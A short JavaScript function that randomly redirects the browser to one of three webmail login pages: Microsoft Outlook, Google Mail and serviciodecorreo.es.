function gen() {
    let num = Math.floor(Math.random() * 3);

    if (num===0){
        location.replace("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=c73bd034-e610-95db-8fd3-f8d93d5658d5&response_mode=fragment&client_info=1&prompt=select_account&nonce=019b267d-9166-7463-abc4-cf6bea435bbd&state=eyJpZCI6IjAxOWIyNjdkLTkxNjYtNzhkMy1iNWViLWE4ZjczMDQyNTJhMyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.26.0&response_type=code&code_challenge=OPafY0btUXE6LepGgUq-SjOsxAuYwX_E3hEBBRfVbec&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob,flname,wld")
    }
    else if (num===1){
        location.replace("https://accounts.google.com/servicelogin?service=mail")
    }
    else {
        location.replace("https://serviciodecorreo.es/?_task=login&_err=session")
    }
}